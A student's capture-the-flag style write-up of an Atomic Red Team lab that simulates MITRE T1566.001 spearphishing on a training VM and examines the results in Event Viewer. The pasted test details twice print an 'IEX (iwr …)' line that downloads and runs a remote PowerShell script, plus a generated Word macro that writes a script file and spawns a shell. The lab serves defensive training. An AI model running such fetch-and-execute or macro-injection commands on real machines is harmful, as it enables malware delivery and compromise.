# Day 4
In this day, learnt about MITRE attacks and atomic attacks.
Step 1:
Started up the VM and got to know about mitre attack frameworks and atomic attacks.
First of all I ran the atomic test on the vm by using the following commands:
~~~
Get-Help Invoke-Atomictest
PS C:\Users\Administrator> Get-Help Invoke-Atomictest

NAME
    Invoke-AtomicTest

SYNTAX
    Invoke-AtomicTest [-AtomicTechnique] <string[]> [-ShowDetails] [-ShowDetailsBrief] [-TestNumbers
    <string[]>] [-TestNames <string[]>] [-TestGuids <string[]>] [-PathToAtomicsFolder <string>]
    [-CheckPrereqs] [-PromptForInputArgs] [-GetPrereqs] [-Cleanup] [-NoExecutionLog] [-ExecutionLogPath
    <string>] [-Force] [-InputArgs <hashtable>] [-TimeoutSeconds <int>] [-Session <PSSession[]>]
    [-Interactive] [-KeepStdOutStdErrFiles] [-LoggingModule <string>] [-WhatIf] [-Confirm]
    [<CommonParameters>]


ALIASES
    None


REMARKS
    None
~~~
This gave me only the surface level info about the atomic attack that has taken place on the machine.

Step 2:
For a deeper dive I used the following commands:
~~~
Invoke-AtomicTest T1566.001 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub reposito
ry, simulating an end user clicking a phishing link to download the file. The file "PhishingAttachment.xl
sm" and PhishingAttachment.txt are downloaded to the %temp% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
$url2 = 'http://localhost/PhishingAttachment.txt'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
Invoke-WebRequest -Uri $url2 -OutFile $env:TEMP\PhishingAttachment.txt

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
Remove-Item $env:TEMP\PhishingAttachment.txt -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line
 is an indiciator of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invo
ke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Sh
ell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invo
ke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Clo
se #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]


PS C:\Users\Administrator> ^C
PS C:\Users\Administrator> ^C
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -ShowDetails
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Download Macro-Enabled Phishing Attachment
Atomic Test Number: 1
Atomic Test GUID: 114ccff9-ae6d-4547-9ead-4cd69f687306
Description: This atomic test downloads a macro enabled document from the Atomic Red Team GitHub reposito
ry, simulating an end user clicking a phishing link to download the file. The file "PhishingAttachment.xl
sm" and PhishingAttachment.txt are downloaded to the %temp% directory.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$url = 'http://localhost/PhishingAttachment.xlsm'
$url2 = 'http://localhost/PhishingAttachment.txt'
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
Invoke-WebRequest -Uri $url2 -OutFile $env:TEMP\PhishingAttachment.txt

Cleanup Commands:
Command:
Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore
Remove-Item $env:TEMP\PhishingAttachment.txt -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Phishing: Spearphishing Attachment T1566.001
Atomic Test Name: Word spawned a command shell and used an IP address in the command line
Atomic Test Number: 2
Atomic Test GUID: cbb6799a-425c-4f83-9194-5447a909d67f
Description: Word spawning a command prompt then running a command with an IP address in the command line
 is an indiciator of malicious activity. Upon execution, CMD will be lauchned and ping 8.8.8.8

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invo
ke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Sh
ell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
Command (with inputs):
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invo
ke-MalDoc.ps1" -UseBasicParsing)
$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Clo
se #1`n   Shell`$ `"ping 8.8.8.8`"`n"
Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"

Cleanup Commands:
Command:
Remove-Item #{jse_path} -ErrorAction Ignore
Command (with inputs):
Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore

Dependencies:
Description: Microsoft Word must be installed
Check Prereq Command:
try {
  New-Object -COMObject "#{ms_product}.Application" | Out-Null
  $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Check Prereq Command (with inputs):
try {
  New-Object -COMObject "Word.Application" | Out-Null
  $process = "Word"; if ( $process -eq "Word") {$process = "winword"}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }
Get Prereq Command:
Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
Get Prereq Command (with inputs):
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
[!!!!!!!!END TEST!!!!!!!]
~~~
This gave me the whole overview on what has happened, like the directory where a file has been downloaded, or the cleanup details, or the prereq that are needed to run the test.

Step 3:
Then check out the conditions required to invoke the tests I had to run the following command with test number as 1 and 2.
~~~
Invoke-AtomicTest T1566.001 -TestNumbers 1 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1566.001-1 Download Macro-Enabled Phishing Attachment
Prerequisites met: T1566.001-1 Download Macro-Enabled Phishing Attachment
PS C:\Users\Administrator> Invoke-AtomicTest T1566.001 -TestNumbers 2 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

CheckPrereq's for: T1566.001-2 Word spawned a command shell and used an IP address in the command line
Prerequisites not met: T1566.001-2 Word spawned a command shell and used an IP address in the command lin
e
        [*] Microsoft Word must be installed
~~~
I noticed that no prerequisite was required for task number 1 but word had to be installed for the task number 2.

~~~
Invoke-AtomicTest T1566.001 -TestNumbers 3 -CheckPrereq
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics
~~~

I also did the above command which gave me no output which signified that there were only 2 tests.


Step 4:
This meant that I could run task number 1 on the vm and check out what changes the machine was undergoing.
To do that I did this:
~~~
Invoke-AtomicTest T1566.001 -TestNumbers 1
PathToAtomicsFolder = C:\Tools\AtomicRedTeam\atomics

Executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
Done executing test: T1566.001-1 Download Macro-Enabled Phishing Attachment
~~~
which executed and did some changes in the machine which I currently wasnt aware of.

Step 5:
Then I also got to know about another argument which was -cleanup which cleared out the changes previously made by executing a test number.
Then the website told me about the event viewer which I viewed after cleaning up, which told me that a file was installed in the temp folder(this file included the flag for q1).

![image](https://github.com/user-attachments/assets/f3c531cd-e345-4142-b2c9-25aea6230b7b)

This screenshot is after I did some more changes for the next few questions.

![image](https://github.com/user-attachments/assets/fc845df2-b322-4650-a98b-9d0092a6ef28)

This was the temp folder after running some tests of the next atomic test as well, but as you can see this contains the file phishing which had the flag.
Then I started to answer the next few questions.

![image](https://github.com/user-attachments/assets/76191787-5f2e-47b6-a025-90e9d92ffe51)


Step 6:
![image](https://github.com/user-attachments/assets/d0e39e51-7820-4356-ab52-ccedbbc1f1c7)

Then after some research I got the answer to q2(website attached).
for q3 the answer was on the same website.

![image](https://github.com/user-attachments/assets/c17138fc-9206-4c2c-b54b-167589888998)

Then after getting to know the new subtechnique id I ran the same tests executed above and noted the changes undergone.

The testnumber 3 gave me the flag for q6.

![image](https://github.com/user-attachments/assets/3f9aadd3-8f49-49d6-af73-37e72972404f)

Then similary I answer the remaining questions using the terminal commands.


Learnings:
This day was very fun as it had alot of learnings.
1) Got to know about atomic testing and mitre attack frameworks.
2) Got to know about the various commands which are used to run atomic attacks on the machine
3) learnt how to use the event viewer application.

References:
https://attack.mitre.org/techniques/T1059/






